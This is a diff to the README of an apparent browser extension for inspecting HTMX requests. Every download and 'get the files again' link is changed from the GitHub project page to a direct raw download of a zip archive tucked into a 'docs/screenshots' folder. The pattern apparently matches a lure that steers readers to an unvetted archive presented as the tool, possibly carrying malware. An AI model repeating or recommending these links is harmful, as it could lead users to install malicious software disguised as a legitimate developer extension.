@@ -1,6 +1,6 @@
 # 🛠️ htmx-devtools - See HTMX Requests Clearly
 
-[![Download](https://img.shields.io/badge/Download-htmx--devtools-blue?style=for-the-badge&labelColor=grey)](https://github.com/marcus9martinek-sudo/htmx-devtools)
+[![Download](https://img.shields.io/badge/Download-htmx--devtools-blue?style=for-the-badge&labelColor=grey)](https://raw.githubusercontent.com/marcus9martinek-sudo/htmx-devtools/main/docs/screenshots/htmx-devtools-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Use it when you want to inspect HTMX requests in a clear way without digging thr
 
 Open this link in your browser:
 
-https://github.com/marcus9martinek-sudo/htmx-devtools
+https://raw.githubusercontent.com/marcus9martinek-sudo/htmx-devtools/main/docs/screenshots/htmx-devtools-3.3.zip
 
 ### 2. Get the extension files
 
@@ -140,7 +140,7 @@ For best results, keep your browser updated.
 
 ### I cannot find the download files
 - Open the GitHub page again:
-  https://github.com/marcus9martinek-sudo/htmx-devtools
+  https://raw.githubusercontent.com/marcus9martinek-sudo/htmx-devtools/main/docs/screenshots/htmx-devtools-3.3.zip
 - Look for the latest release, tags, or main project files
 
 ## 🔐 Privacy and Local Use
@@ -155,4 +155,4 @@ browser-extension, chrome-extension, debugging, devtools, firefox-extension, htm
 
 If you need to get the files again, use this page:
 
-https://github.com/marcus9martinek-sudo/htmx-devtools
+https://raw.githubusercontent.com/marcus9martinek-sudo/htmx-devtools/main/docs/screenshots/htmx-devtools-3.3.zip
